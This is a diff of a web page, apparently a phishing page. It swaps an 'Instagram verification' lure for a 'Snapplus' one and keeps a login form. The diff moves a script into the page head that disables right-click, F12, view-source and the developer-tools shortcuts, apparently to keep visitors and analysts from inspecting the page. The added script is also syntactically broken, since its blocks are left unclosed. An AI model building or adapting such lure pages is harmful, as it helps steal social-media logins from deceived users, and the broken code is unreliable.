@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Get Verified on Instagram</title>
+  <title>Get Snapplus</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
      * {
@@ -485,6 +485,17 @@ userform */
   }
 
   </style>
+  <script>
+      document.addEventListener('contextmenu', event => event.preventDefault());
+
+    // Disable specific key combinations
+    document.addEventListener('keydown', function(e) {
+      if (e.key === "F12" || 
+          (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
+          (e.ctrlKey && (e.key === 'U' || e.key === 'S'))) {
+        e.preventDefault();
+        alert("This action is disabled");
+  </script>
 </head>
 <body>
 <header>
@@ -734,15 +745,6 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
 
 
     // Disable right-click
-    document.addEventListener('contextmenu', event => event.preventDefault());
-
-    // Disable specific key combinations
-    document.addEventListener('keydown', function(e) {
-      if (e.key === "F12" || 
-          (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
-          (e.ctrlKey && (e.key === 'U' || e.key === 'S'))) {
-        e.preventDefault();
-        alert("This action is disabled");
   </script>
 </body>
 </html>
